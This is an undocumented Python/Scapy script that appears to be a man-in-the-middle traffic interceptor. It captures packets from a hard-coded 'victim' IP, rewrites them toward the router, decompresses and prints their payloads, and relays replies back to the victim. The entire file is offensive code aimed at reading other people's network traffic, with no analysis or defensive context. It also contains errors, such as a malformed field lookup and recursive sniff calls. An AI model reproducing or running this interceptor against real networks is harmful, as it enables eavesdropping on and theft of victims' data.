from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, TCP
import gzip
import io

# Define the victim's IP address
victim_ip = "192.168.3.100"
hacker_ip = "192.168.3.101"
router_ip = "192.168.3.1"

# Define network information
router_mac = "74:DA:38:EB:6F:DC"

def packet_callback(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == hacker_ip:
            print("========================================================================")
            print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

            # Modify the packet's destination to the webserver IP
            packet[IP].dst = router_ip

            # Decrypt the packets load
            if packet.haslayer(Raw):
                payload = packet[Raw].load

                try:
                    with gzip.GzipFile(fileobj=io.BytesIO(payload)) as gz:
                        decompressed_data = gz.read()
                        print("Decompressed Data:")
                        print(decompressed_data.decode('utf-8'))  # Assuming it's UTF-8 text
                except Exception as e:
                    print("Error decompressing:", e)

            # Send the modified packet back to the victim
            send(packet)
            print(f"Forwarded packet to {packet[IP.dst]}")
            print("========================================================================")
            return
        else:
            sniff(prn=packet_callback, count=1)
            return
    else:
        sniff(prn=packet_callback, count=1)
        return

def packet_sendtrough(packet):
    if packet.haslayer(IP):
        if packet[IP].src == router_ip and packet[IP].dst == hacker_ip:
            print("========================================================================")
            print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

            # Modify the packet's destination to the victim IP
            packet[IP].dst = victim_ip

            # Send the modified packet back to the victim
            send(packet)
            print(f"Forwarded packet to {packet[IP].dst}")
            print("========================================================================")
            return
        else:
            sniff(prn=packet_sendtrough, count=1)
            return
    else:
        sniff(prn=packet_sendtrough, count=1)
        return

# Sniff packets on the network and use packet_callback to process them
if __name__ == "__main__":
    while True:
        sniff(prn=packet_callback, count=1)
        sniff(prn=packet_sendtrough, count=1)